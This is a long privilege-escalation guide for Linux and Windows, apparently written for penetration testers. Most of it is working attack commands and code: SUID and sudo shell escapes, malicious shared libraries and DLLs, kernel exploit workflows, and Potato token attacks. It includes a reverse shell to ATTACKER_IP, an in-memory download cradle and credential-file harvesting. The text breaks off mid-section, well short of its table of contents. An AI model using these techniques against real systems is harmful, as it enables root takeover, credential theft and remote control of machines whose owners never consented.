# Privilege Escalation Techniques — Linux and Windows Complete Guide

> Encyclopedic reference for senior IT professionals and ethical hackers.  
> Covers fundamentals, enumeration, exploitation, Active Directory, cloud, containers, defense, and lab exercises.

---

## Table of Contents

1. [Privilege Escalation Fundamentals](#1-privilege-escalation-fundamentals)
2. [Linux Enumeration](#2-linux-enumeration)
3. [Linux Privilege Escalation Techniques](#3-linux-privilege-escalation-techniques)
4. [Windows Enumeration](#4-windows-enumeration)
5. [Windows Privilege Escalation Techniques](#5-windows-privilege-escalation-techniques)
6. [Active Directory Privilege Escalation](#6-active-directory-privilege-escalation)
7. [Cloud Privilege Escalation](#7-cloud-privilege-escalation)
8. [Container Privilege Escalation](#8-container-privilege-escalation)
9. [Defense and Detection](#9-defense-and-detection)
10. [Lab: Privilege Escalation Practice](#10-lab-privilege-escalation-practice)

---

## 1. Privilege Escalation Fundamentals

### 1.1 Definition and Classification

Privilege escalation is the exploitation of a vulnerability, design flaw, or misconfiguration in an operating system or application to gain elevated access to resources that are normally protected from a user or process. It represents one of the most critical phases in both offensive security operations and real-world attacks.

#### Horizontal vs Vertical Escalation

| Type | Definition | Example |
|------|-----------|---------|
| **Vertical** | Moving from lower to higher privilege | User → root, Standard user → Administrator |
| **Horizontal** | Accessing another user's resources at the same privilege level | User A reading User B's mailbox |

Vertical escalation is the primary focus of this document — gaining root/SYSTEM/Domain Admin from a low-privilege foothold. Horizontal escalation often serves as a stepping stone: compromising a service account that holds specific permissions enabling further vertical escalation.

#### Local vs Remote Escalation

| Type | Attack Vector | Risk Profile |
|------|--------------|--------------|
| **Local** | Requires existing access (shell, session) on the target | Most common post-exploitation scenario |
| **Remote** | Exploiting a remotely accessible vulnerability that directly yields elevated privileges | Higher severity, often pre-authentication |

#### Escalation Vector Taxonomy

| Vector | Description | Typical CVSS |
|--------|-------------|-------------|
| **Kernel** | Exploiting OS kernel vulnerabilities | 7.8 – 9.8 |
| **Service** | Abusing misconfigured system services | 6.5 – 8.8 |
| **Application** | Leveraging application-level flaws | 5.0 – 8.0 |
| **Configuration** | Exploiting insecure defaults or admin errors | 5.0 – 7.8 |
| **Credential** | Reusing or extracting stored credentials | 6.0 – 9.0 |

### 1.2 Common Root Causes

1. **Misconfigurations** — Insecure file permissions, overly permissive sudo rules, writable system paths, default credentials, unquoted service paths
2. **Vulnerabilities** — Kernel bugs, service-level exploits, race conditions, buffer overflows in privileged binaries
3. **Design Flaws** — SUID philosophy (running with owner permissions), Windows token impersonation model, implicit trust between services, inheritance of privileges across process boundaries
4. **Missing Patches** — Known CVEs left unpatched because of operational constraints or negligence
5. **Credential Exposure** — Passwords in scripts, history files, configuration files, memory dumps, or cached tokens

### 1.3 Privilege Escalation in MITRE ATT&CK

| Technique ID | Name | Description |
|-------------|------|-------------|
| **T1068** | Exploitation for Privilege Escalation | Exploiting software vulnerabilities in OS or applications to execute code with higher privileges |
| **T1548** | Abuse Elevation Control Mechanism | Bypassing UAC, sudo abuse, setuid/setgid abuse, elevated execution with prompt |
| **T1134** | Access Token Manipulation | Creating or modifying Windows tokens; token impersonation/theft |
| **T1078** | Valid Accounts | Using legitimate credentials (default, domain, local, cloud) for escalation |
| **T1053** | Scheduled Task/Job | Creating or modifying scheduled tasks to execute with elevated privileges |
| **T1543** | Create or Modify System Process | Installing services, daemons, or launch agents for persistence and escalation |
| **T1574** | Hijack Execution Flow | DLL side-loading, PATH interception, LD_PRELOAD injection |

### 1.4 Enumeration Methodology — What to Look For First

The systematic approach to privilege escalation follows this priority order:

```
1. Quick Wins (immediate impact)
   ├── Credentials in files (passwords, tokens, keys)
   ├── Sudo/service misconfigurations
   └── Known kernel exploits matching exact version

2. Service & Process Analysis
   ├── Running services as root/SYSTEM
   ├── Writable service binaries or configurations
   └── Scheduled tasks/cron with weak permissions

3. File System Analysis
   ├── SUID/SGID binaries (Linux)
   ├── Writable system paths
   └── World-readable sensitive files

4. Network & Environment
   ├── Internal services listening on localhost
   ├── NFS/SMB shares with weak permissions
   └── Docker/container escape vectors

5. Deep Exploitation
   ├── Kernel exploit compilation/execution
   ├── Race conditions
   └── Complex chain attacks
```

Always enumerate before exploiting. Firing kernel exploits blindly risks crashing the target and losing access.

---

## 2. Linux Enumeration

### 2.1 Automated Tools

#### LinPEAS (Linux Privilege Escalation Awesome Script)

The gold standard for automated Linux enumeration. Checks hundreds of vectors and color-codes findings by severity.

```bash
# Transfer and execute
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh

# Or download first, transfer via your preferred method
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh -a 2>&1 | tee linpeas_output.txt

# Run specific checks only
./linpeas.sh -s    # superfast (only critical checks)
./linpeas.sh -P    # only password-related checks
```

#### LinEnum

```bash
./LinEnum.sh -t -k password -r report -e /tmp/
# -t: thorough tests
# -k: keyword to grep for
# -r: report filename
# -e: export location for binaries
```

#### linux-exploit-suggester

```bash
# Suggests kernel exploits based on kernel version
./linux-exploit-suggester.sh
# Or the Python version for more detail
python linux-exploit-suggester-2.py

# Example output:
# [+] [CVE-2022-0847] DirtyPipe
#   Details: https://haxx.in/files/dirtypipez.c
#   Exposure: highly probable
#   Tags: [ ubuntu=20.04 ],[ ubuntu=21.04 ]
#   Download URL: https://haxx.in/files/dirtypipez.c
```

#### pspy — Process Snooping Without Root

```bash
# Monitor processes without root privileges
./pspy64 -pf -i 1000

# Flags:
# -p: print commands
# -f: print file system events
# -i: interval in milliseconds

# This reveals:
# - Cron jobs executed by other users
# - Scripts run by root periodically
# - Service restarts and their parameters
# - Inter-process communication patterns
```

### 2.2 Manual Enumeration Checks

#### System Information

```bash
# Kernel and distribution
uname -a
cat /etc/os-release
cat /proc/version
hostnamectl

# Architecture
arch
dpkg --print-architecture

# Environment
env
set
echo $PATH
```

#### SUID/SGID Binaries

```bash
# Find SUID binaries (execute as owner)
find / -perm -4000 -type f 2>/dev/null

# Find SGID binaries (execute as group)
find / -perm -2000 -type f 2>/dev/null

# Combined
find / -perm -u=s -type f 2>/dev/null
find / -perm /6000 -type f 2>/dev/null

# Example dangerous SUID findings:
# /usr/bin/find (can exec commands)
# /usr/bin/vim (can write files)
# /usr/bin/python3 (can spawn shell)
# /usr/bin/env (can run anything)
# /usr/local/bin/custom_backup (custom binary — investigate)
```

#### Capabilities

```bash
# List all binaries with capabilities
getcap -r / 2>/dev/null

# Dangerous capabilities:
# cap_setuid — can change UID (instant root)
# cap_dac_read_search — bypass file read permission checks
# cap_dac_override — bypass write permission checks
# cap_net_raw — can craft raw packets (for MITM)
# cap_sys_admin — can mount filesystems, use ptrace, etc.
# cap_sys_ptrace — can inject into processes

# Example output:
# /usr/bin/python3.8 = cap_setuid+ep
# /usr/bin/perl = cap_dac_read_search+ep
```

#### Sudo Permissions

```bash
# Check current user's sudo permissions
sudo -l

# Example dangerous output:
# User www-data may run the following commands on target:
#     (ALL) NOPASSWD: /usr/bin/find
#     (ALL) NOPASSWD: /usr/bin/vim
#     (root) NOPASSWD: /usr/bin/python3 /opt/scripts/*.py
#     (ALL) NOPASSWD: /usr/bin/env
#     (ALL) NOPASSWD: /usr/bin/awk

# Check sudo version (vulnerable versions exist)
sudo --version
```

#### Cron Jobs

```bash
# System-wide cron
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# User-specific cron
crontab -l
ls -la /var/spool/cron/crontabs/

# Systemd timers (modern replacement)
systemctl list-timers --all

# Check if cron scripts are writable
find /etc/cron* -writable -type f 2>/dev/null
```

#### Writable Paths and Files

```bash
# World-writable directories
find / -writable -type d 2>/dev/null

# Writable files owned by root
find / -writable -user root -type f 2>/dev/null

# Files writable by current user's groups
id
find / -group $(id -gn) -writable -type f 2>/dev/null

# Check PATH for writable directories
echo $PATH | tr ':' '\n' | xargs -I{} sh -c 'test -w {} && echo "WRITABLE: {}"'
```

#### NFS Shares

```bash
# Check NFS exports
cat /etc/exports
showmount -e localhost
showmount -e <target-ip>

# Look for no_root_squash (critical misconfiguration)
# Example dangerous line:
# /srv/share  *(rw,sync,no_root_squash)
```

#### Running Services and Open Ports

```bash
# Services
systemctl list-units --type=service --state=running
ps aux | grep -i root
ps -ef

# Network
ss -tulnp
netstat -tulnp
cat /etc/services

# Internal services not externally accessible
ss -tulnp | grep 127.0.0.1
```

#### Installed Packages and Kernel Version

```bash
# Kernel version (for exploit matching)
uname -r
cat /proc/version

# Installed packages
dpkg -l          # Debian/Ubuntu
rpm -qa          # RHEL/CentOS
pacman -Q        # Arch

# Check for development tools (useful for compiling exploits)
which gcc cc make python python3 perl
```

### 2.3 Sensitive File Locations

```bash
# Password and authentication files
cat /etc/passwd           # User accounts (check for password hashes in field 2)
cat /etc/shadow           # Password hashes (requires root, but check permissions)
cat /etc/group            # Group memberships
cat /etc/sudoers          # Sudo rules (check permissions)
cat /etc/sudoers.d/*      # Additional sudo rules

# SSH keys
find / -name "id_rsa" -o -name "id_ed25519" -o -name "authorized_keys" 2>/dev/null
ls -la /home/*/.ssh/
ls -la /root/.ssh/

# History and environment
cat /home/*/.bash_history
cat /home/*/.zsh_history
cat /root/.bash_history
cat /home/*/.mysql_history
cat /home/*/.psql_history
env
cat /proc/*/environ 2>/dev/null

# Configuration files with potential credentials
find / -name "*.conf" -exec grep -l "pass\|password\|pwd\|credential\|secret\|key" {} \; 2>/dev/null
cat /etc/mysql/my.cnf
cat /etc/postgresql/*/main/pg_hba.conf
cat /var/www/*/wp-config.php
cat /opt/*/config*
find / -name ".env" 2>/dev/null
find / -name "*.bak" -o -name "*.old" -o -name "*.save" 2>/dev/null

# Backup files
find / -name "*.bak" -type f 2>/dev/null
find / -name "*.backup" -type f 2>/dev/null
```

---

## 3. Linux Privilege Escalation Techniques

### 3.1 SUID Exploitation

SUID (Set User ID) binaries execute with the file owner's permissions regardless of who runs them. When owned by root, they are prime escalation targets.

#### GTFOBins Reference Exploitation

GTFOBins (https://gtfobins.github.io/) catalogs Unix binaries exploitable for privilege escalation. Common SUID abuses:

```bash
# find with SUID
find . -exec /bin/sh -p \;

# vim/vi with SUID
vim -c ':!/bin/sh'

# python3 with SUID
python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# env with SUID
env /bin/sh -p

# nmap (old versions with interactive mode)
nmap --interactive
!sh

# awk with SUID
awk 'BEGIN {system("/bin/sh -p")}'

# less/more with SUID
less /etc/shadow
!/bin/sh

# bash with SUID
bash -p

# cp with SUID (overwrite /etc/passwd)
cp /etc/passwd /tmp/passwd.bak
# Create line: hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash
# cp modified_passwd /etc/passwd

# perl with SUID
perl -e 'exec "/bin/sh";'
```

#### Custom SUID Binary Abuse

When encountering unknown SUID binaries, analyze their behavior:

```bash
# Identify the binary type
file /usr/local/bin/custom_suid

# Check for library dependencies
ldd /usr/local/bin/custom_suid

# Trace system calls
ltrace /usr/local/bin/custom_suid
strace /usr/local/bin/custom_suid

# Check for relative path calls (PATH injection opportunity)
strings /usr/local/bin/custom_suid | grep -i "path\|exec\|system\|popen"

# Example: binary calls "service" without full path
# Exploit via PATH manipulation:
echo '/bin/bash -p' > /tmp/service
chmod +x /tmp/service
export PATH=/tmp:$PATH
/usr/local/bin/custom_suid
```

### 3.2 Sudo Misconfigurations

#### NOPASSWD Exploitation

```bash
# If sudo -l shows NOPASSWD entries, check GTFOBins for each binary
# Example: (ALL) NOPASSWD: /usr/bin/find
sudo find / -exec /bin/sh \; -quit

# Example: (ALL) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# Example: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c '!bash'

# Example: (ALL) NOPASSWD: /usr/bin/less
sudo less /etc/shadow
!/bin/bash

# Example: (ALL) NOPASSWD: /usr/bin/awk
sudo awk 'BEGIN {system("/bin/bash")}'

# Example: (ALL) NOPASSWD: /usr/bin/man
sudo man man
!/bin/bash

# Example: (ALL) NOPASSWD: /usr/bin/tee
echo "hacker ALL=(ALL) NOPASSWD:ALL" | sudo tee -a /etc/sudoers
```

#### env_keep Exploitation

```bash
# If sudo preserves environment variables:
# Defaults env_keep += "LD_PRELOAD"
# Defaults env_keep += "LD_LIBRARY_PATH"

# This is an instant root escalation path
```

#### LD_PRELOAD Exploitation

When `env_keep` includes `LD_PRELOAD`:

```c
// shell.c — compile this shared library
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0, 0, 0);
    system("/bin/bash -p");
}
```

```bash
gcc -fPIC -shared -nostartfiles -o /tmp/shell.so shell.c
sudo LD_PRELOAD=/tmp/shell.so /usr/bin/any_allowed_binary
```

#### LD_LIBRARY_PATH Exploitation

```c
// Identify which libraries a sudo-allowed binary loads
ldd /usr/bin/allowed_binary

// Create a malicious library with the same name
// lib_hijack.c
#include <stdio.h>
#include <stdlib.h>

void some_function() {  // match an exported symbol
    system("/bin/bash -p");
}
```

```bash
gcc -fPIC -shared -o /tmp/libfoo.so lib_hijack.c
sudo LD_LIBRARY_PATH=/tmp /usr/bin/allowed_binary
```

### 3.3 Capabilities Abuse

#### cap_setuid

```bash
# If python3 has cap_setuid+ep
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# If perl has cap_setuid+ep
perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'

# If ruby has cap_setuid+ep
ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

#### cap_dac_read_search

```bash
# Bypass file read permissions — read any file on the system
# If tar has this capability:
tar czf /tmp/shadow.tar.gz /etc/shadow
tar xzf /tmp/shadow.tar.gz -C /tmp/
cat /tmp/etc/shadow

# If python3 has this capability:
python3 -c "print(open('/etc/shadow').read())"
```

#### cap_net_raw

```bash
# Allows raw packet crafting — useful for network sniffing
# If tcpdump or python has this:
tcpdump -i eth0 -w /tmp/capture.pcap
# Or craft ARP spoofing packets for MITM
```

### 3.4 Cron Job Exploitation

#### Writable Cron Scripts

```bash
# Identify cron jobs running as root
cat /etc/crontab
# * * * * * root /opt/scripts/backup.sh

# Check if the script is writable
ls -la /opt/scripts/backup.sh
# -rwxrwxrwx 1 root root 234 Jan 15 2024 /opt/scripts/backup.sh

# Inject reverse shell
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /opt/scripts/backup.sh

# Or add SUID to bash
echo 'chmod u+s /bin/bash' >> /opt/scripts/backup.sh
# Then: /bin/bash -p
```

#### PATH Manipulation in Cron

```bash
# If crontab has a custom PATH or script uses relative paths:
# PATH=/home/user/bin:/usr/local/bin:/usr/bin:/bin
# * * * * * root backup_script

# Create malicious binary in a PATH directory you control
echo '#!/bin/bash
chmod u+s /bin/bash' > /home/user/bin/backup_script
chmod +x /home/user/bin/backup_script
# Wait for cron execution, then: /bin/bash -p
```

#### Wildcard Injection

```bash
# If cron runs something like:
# * * * * * root cd /opt/data && tar czf /backup/data.tar.gz *

# Tar wildcard injection:
cd /opt/data
echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo '#!/bin/bash
chmod u+s /bin/bash' > shell.sh
chmod +x shell.sh

# When tar expands *, it interprets filenames as flags
# tar czf /backup/data.tar.gz --checkpoint=1 --checkpoint-action=exec=sh shell.sh ...
```

### 3.5 NFS no_root_squash

```bash
# On attacker machine, mount the NFS share
showmount -e TARGET_IP
mkdir /tmp/nfs_mount
mount -o rw,vers=3 TARGET_IP:/srv/share /tmp/nfs_mount

# Create SUID binary as root on attacker machine
cat > /tmp/nfs_mount/suid_shell.c << 'EOF'
#include <stdio.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOF

gcc /tmp/nfs_mount/suid_shell.c -o /tmp/nfs_mount/suid_shell
chmod u+s /tmp/nfs_mount/suid_shell

# On target machine:
/srv/share/suid_shell
# Yields root shell
```

### 3.6 Writable /etc/passwd

```bash
# Check if /etc/passwd is writable
ls -la /etc/passwd

# Generate password hash
openssl passwd -1 -salt xyz hacked
# Output: $1$xyz$...hash...

# Add root-equivalent user
echo 'hacker:$1$xyz$HashedPassword:0:0:Hacker:/root:/bin/bash' >> /etc/passwd

# Or replace root's password field (if 'x' is present, shadow is used)
# If /etc/passwd has the actual hash instead of 'x', replace it directly

# Switch to new user
su hacker
# Password: hacked
```

### 3.7 Kernel Exploits

#### DirtyPipe (CVE-2022-0847) — Linux 5.8+

```bash
# Affects: Linux kernel 5.8 through 5.16.10
# Impact: Write to arbitrary read-only files, overwrite SUID binaries

# Check kernel version
uname -r

# Compile and execute
wget https://haxx.in/files/dirtypipez.c
gcc dirtypipez.c -o dirtypipez
./dirtypipez /usr/bin/su
# Overwrites /usr/bin/su with a shell, execute it for root
```

#### DirtyCow (CVE-2016-5195) — Linux 2.6.22+

```bash
# Affects: Linux kernel 2.6.22 through 4.8.2
# Classic race condition in copy-on-write mechanism

# Multiple variants exist:
# dirty.c — /etc/passwd overwrite
# dcow.cpp — /etc/passwd overwrite (C++)
# cowroot.c — SUID shell creation

gcc -pthread dirty.c -o dirty -lcrypt
./dirty newpassword
# Overwrites root's password in /etc/passwd

# Or the pokemon variant for /etc/passwd modification
gcc -pthread cowroot.c -o cowroot
./cowroot
```

#### OverlayFS (CVE-2021-3493)

```bash
# Affects: Ubuntu kernels with overlayfs
# Allows setting capabilities on files in overlayfs mounts

# Check if overlayfs is available
cat /proc/filesystems | grep overlay

# Compile and run
gcc exploit.c -o exploit
./exploit
# Yields root shell
```

#### PwnKit (CVE-2021-4034)

```bash
# Affects: Polkit's pkexec (present on virtually all Linux distros since 2009)
# Memory corruption in command-line argument parsing

gcc pwnkit.c -o pwnkit
./pwnkit
# Instant root on any system with vulnerable polkit
```

### 3.8 Docker Group Escalation

```bash
# If current user is in the docker group:
id
# uid=1000(user) gid=1000(user) groups=1000(user),998(docker)

# Mount host filesystem
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

# Or just read sensitive files
docker run -v /:/mnt --rm alpine cat /mnt/etc/shadow

# Create SUID binary
docker run -v /:/mnt --rm -it alpine sh -c 'cp /bin/sh /mnt/tmp/rootsh && chmod u+s /mnt/tmp/rootsh'
# On host: /tmp/rootsh -p

# If docker socket is accessible:
docker run -v /var/run/docker.sock:/var/run/docker.sock -it alpine sh
# From inside, spawn privileged container with host namespace
```

### 3.9 Systemd Timer/Service Manipulation

```bash
# Check for writable service files
find /etc/systemd/system/ -writable -type f 2>/dev/null
find /usr/lib/systemd/system/ -writable -type f 2>/dev/null

# If a service file is writable:
cat /etc/systemd/system/vulnerable.service
# [Service]
# ExecStart=/opt/scripts/run.sh
# User=root

# Modify ExecStart to execute payload
echo '[Service]
ExecStart=/bin/bash -c "chmod u+s /bin/bash"
User=root' > /etc/systemd/system/vulnerable.service

systemctl daemon-reload
systemctl restart vulnerable.service
/bin/bash -p

# Writable timer exploitation
cat /etc/systemd/system/backup.timer
# If timer triggers a service with writable ExecStart, same technique applies
```

### 3.10 Shared Library Hijacking

```bash
# Find binaries with RPATH or RUNPATH set to writable directories
readelf -d /usr/local/bin/target_binary | grep -i "rpath\|runpath"
# Or check LD_LIBRARY_PATH in service configurations

# Identify missing libraries
ldd /usr/local/bin/target_binary
# libcustom.so => not found

# If the search path includes a writable directory:
cat > /tmp/libcustom.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static void escalate() __attribute__((constructor));

void escalate() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF

gcc -shared -fPIC -o /writable/path/libcustom.so /tmp/libcustom.c
# Execute the target binary — library loads and constructor fires
```

### 3.11 Python Library Hijacking

```bash
# If a root-executed Python script imports a module from a writable path:
# Check Python path priority
python3 -c "import sys; print('\n'.join(sys.path))"

# If script does: import custom_module
# And /usr/local/lib/python3.x/dist-packages/ is writable:

cat > /usr/local/lib/python3.x/dist-packages/custom_module.py << 'EOF'
import os
os.system("chmod u+s /bin/bash")
EOF

# Wait for root script execution, then: /bin/bash -p

# Or if the script's directory is writable:
# Place malicious module in same directory (takes import priority)
```

---

## 4. Windows Enumeration

### 4.1 Automated Tools

#### WinPEAS

```powershell
# Execute WinPEAS
.\winPEASx64.exe

# Specific checks
.\winPEASx64.exe quiet servicesinfo
.\winPEASx64.exe quiet filesinfo
.\winPEASx64.exe quiet userinfo

# Run from memory (fileless)
IEX(New-Object Net.WebClient).downloadString('http://ATTACKER/winPEAS.bat')
```

#### PowerUp (PowerSploit)

```powershell
# Import and run all checks
Import-Module .\PowerUp.ps1
Invoke-AllChecks

# Specific checks
Get-ServiceUnquoted
Get-ModifiableServiceFile
Get-ModifiableService
Get-RegistryAlwaysInstallElevated
Get-UnattendedInstallFile
Get-RegistryAutoLogon
```

#### Seatbelt

```powershell
# Comprehensive system enumeration
.\Seatbelt.exe -group=all

# Specific groups
.\Seatbelt.exe -group=system     # OS info, patches, services
.\Seatbelt.exe -group=user       # User info, tokens, credentials
.\Seatbelt.exe -group=misc       # Interesting files, registry keys
.\Seatbelt.exe -group=chrome     # Chrome data
```

#### SharpUp

```powershell
# .NET port of PowerUp
.\SharpUp.exe audit

# Output identifies:
# - Modifiable services
# - Unquoted service paths
# - Modifiable service binaries
# - AlwaysInstallElevated
# - Modifiable scheduled tasks
```

#### Watson

```powershell
# Identifies missing patches for known privilege escalation CVEs
.\Watson.exe

# Checks for:
# - CVE-2019-0836 (Windows 10 LPE)
# - CVE-2019-1388 (Certificate Dialog UAC Bypass)
# - CVE-2020-0787 (BITS Arbitrary File Move)
# - CVE-2020-1472 (Zerologon)
```

### 4.2 Manual Enumeration Checks

#### System Information

```cmd
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix"

:: Architecture
echo %PROCESSOR_ARCHITECTURE%

:: Hostname and domain
hostname
echo %USERDOMAIN%

:: Current user context
whoami
whoami /priv
whoami /groups
whoami /all

:: Users and groups
net user
net localgroup
net localgroup Administrators
net user administrator
```

```powershell
# PowerShell equivalents
Get-ComputerInfo | Select-Object CsName, WindowsVersion, OsBuildNumber
Get-HotFix | Sort-Object -Property InstalledOn -Descending | Select-Object -First 10
[System.Security.Principal.WindowsIdentity]::GetCurrent() | Select-Object Name, Groups
```

#### Service Permissions

```cmd
:: List all services
sc query state= all
wmic service list brief

:: Get service details
sc qc <ServiceName>
wmic service get name,displayname,pathname,startmode

:: Check service permissions with accesschk (Sysinternals)
accesschk.exe -uwcqv "Everyone" *
accesschk.exe -uwcqv "Authenticated Users" *
accesschk.exe -uwcqv "Users" *
accesschk.exe -uwcqv %username% *
```

```powershell
# Check service binary path permissions
Get-Acl "C:\Program Files\VulnService\service.exe" | Format-List
Get-WmiObject Win32_Service | Where-Object {$_.StartMode -eq "Auto"} |
    Select-Object Name, StartName, PathName, State
```

#### Unquoted Service Paths

```cmd
:: Find services with unquoted paths containing spaces
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """

:: Example vulnerable path:
:: C:\Program Files\Vulnerable Service\service.exe
:: Windows will try:
:: C:\Program.exe
:: C:\Program Files\Vulnerable.exe
:: C:\Program Files\Vulnerable Service\service.exe
```

```powershell
Get-WmiObject Win32_Service |
    Where-Object { $_.PathName -notmatch '^"' -and $_.PathName -match ' ' } |
    Select-Object Name, PathName, StartMode, StartName
```

#### AlwaysInstallElevated

```cmd
:: Check if AlwaysInstallElevated is enabled (both must be 1)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

#### Stored Credentials

```cmd
:: Stored credentials
cmdkey /list

:: If credentials found, use with:
runas /savecred /user:DOMAIN\admin "cmd.exe /c whoami > C:\temp\whoami.txt"

:: Unattended install files (may contain passwords)
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul

:: Common credential locations
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattend\Unattend.xml
type C:\Windows\system32\sysprep\sysprep.xml
type C:\Windows\system32\sysprep\sysprep.inf
```

```powershell
# Search for passwords in files
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.xml,*.config -Recurse -ErrorAction SilentlyContinue |
    Select-String -Pattern "password|passwd|pwd|credential" -CaseSensitive:$false

# Registry passwords
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>$null | findstr "DefaultPassword"
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
```

#### Token Privileges

```cmd
whoami /priv

:: Dangerous privileges:
:: SeImpersonatePrivilege — Token impersonation (Potato attacks)
:: SeAssignPrimaryTokenPrivilege — Assign tokens to processes
:: SeBackupPrivilege — Read any file
:: SeRestorePrivilege — Write any file
:: SeDebugPrivilege — Debug processes (inject into SYSTEM)
:: SeTakeOwnershipPrivilege — Take ownership of objects
:: SeLoadDriverPrivilege — Load kernel drivers
```

#### Scheduled Tasks

```cmd
schtasks /query /fo TABLE /nh
schtasks /query /fo LIST /v

:: Check task file permissions
icacls "C:\path\to\scheduled\script.bat"
```

```powershell
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"} |
    ForEach-Object {
        $info = Get-ScheduledTaskInfo $_
        [PSCustomObject]@{
            TaskName = $_.TaskName
            TaskPath = $_.TaskPath
            State = $_.State
            RunAs = $_.Principal.UserId
            Actions = ($_.Actions | ForEach-Object { $_.Execute })
        }
    }
```

#### DLL Hijacking Opportunities

```powershell
# Find processes loading DLLs from writable paths
# Use Process Monitor (procmon) with these filters:
# - Result is NAME NOT FOUND
# - Path ends with .dll
# - Operation is CreateFile

# Or enumerate writable directories in PATH
$env:PATH -split ';' | ForEach-Object {
    if (Test-Path $_) {
        $acl = Get-Acl $_
        if ($acl.Access | Where-Object { $_.IdentityReference -match "Users|Everyone|Authenticated" -and $_.FileSystemRights -match "Write" }) {
            Write-Output "WRITABLE: $_"
        }
    }
}
```

---

## 5. Windows Privilege Escalation Techniques

### 5.1 Service Exploitation

#### Unquoted Service Paths

```cmd
:: Identify vulnerable service
sc qc "Vulnerable Service"
:: [SC] QueryServiceConfig SUCCESS
:: SERVICE_NAME: VulnService
::         BINARY_PATH_NAME   : C:\Program Files\Vulnerable App\Sub Directory\service.exe
::         SERVICE_START_NAME : LocalSystem

:: Check if we can write to intermediate paths
icacls "C:\Program Files\Vulnerable App"

:: Create payload at injection point
msfvenom -p windows/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe > "C:\Program Files\Vulnerable App\Sub.exe"

:: Restart service (or wait for reboot)
sc stop "Vulnerable Service"
sc start "Vulnerable Service"
```

#### Weak Service Permissions

```cmd
:: If service is modifiable by current user (SERVICE_CHANGE_CONFIG):
sc config VulnService binpath= "C:\temp\shell.exe"
sc config VulnService obj= "LocalSystem" password= ""
sc stop VulnService
sc start VulnService

:: Or configure to execute a command:
sc config VulnService binpath= "cmd /c net localgroup administrators USER /add"
sc stop VulnService
sc start VulnService
```

#### DLL Hijacking

```c
// malicious.c — DLL that executes payload when loaded
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
    if (reason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /c net localgroup administrators lowprivuser /add");
        // Or: WinExec("C:\\temp\\shell.exe", 0);
    }
    return TRUE;
}
```

```cmd
:: Compile
x86_64-w64-mingw32-gcc malicious.c -shared -o malicious.dll

:: Place in DLL search order path:
:: 1. Directory of the executable
:: 2. System directory (C:\Windows\System32)
:: 3. 16-bit system directory
:: 4. Windows directory
:: 5. Current directory
:: 6. PATH directories
```

#### DLL Sideloading

```powershell
# DLL sideloading targets legitimate signed applications that load DLLs by name
# without full path verification

# Common targets:
# - Signed Microsoft binaries that load specific DLLs
# - Third-party applications with known sideloading vectors
# - Applications with manifest files specifying DLL names

# Process:
# 1. Identify target application and required DLL name
# 2. Create malicious DLL with same name and correct exports
# 3. Place alongside the legitimate executable
# 4. Execute the legitimate application — it loads your DLL
```

### 5.2 Token Manipulation

#### SeImpersonatePrivilege Exploitation

This privilege is assigned to service accounts (IIS, MSSQL, etc.) and allows impersonation of any token. The "Potato" family of exploits leverages this.

#### JuicyPotato (Windows Server 2008-2016, Windows 7-10)

```cmd
:: Requires SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege
whoami /priv

:: Execute
JuicyPotato.exe -l 1337 -p c:\temp\shell.exe -t * -c {CLSID}

:: Common CLSIDs:
:: {4991d34b-80a1-4291-83b6-3328366b9097} — Windows 10
:: {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83} — Windows Server 2016
```

#### RoguePotato (Windows 10 1809+, Server 2019)

```cmd
:: Works when JuicyPotato CLSID abuse is patched
:: Requires an attacker-controlled machine for OXID resolution

:: On attacker (redirect port 135):
socat tcp-listen:135,reuseaddr,fork tcp:TARGET_IP:9999

:: On target:
RoguePotato.exe -r ATTACKER_IP -e "C:\temp\shell.exe" -l 9999
```

#### PrintSpoofer (Windows 10, Server 2016/2019)

```cmd
:: Exploits the Print Spooler service for token impersonation
:: Simpler than RoguePotato — no external machine needed

PrintSpoofer.exe -c "C:\temp\shell.exe"
PrintSpoofer.exe -i -c cmd

:: From a web shell / service context:
PrintSpoofer.exe -i -c "powershell -c whoami"
```

#### GodPotato (Windows 8-11, Server 2012-2022)

```cmd
:: Works on latest Windows versions
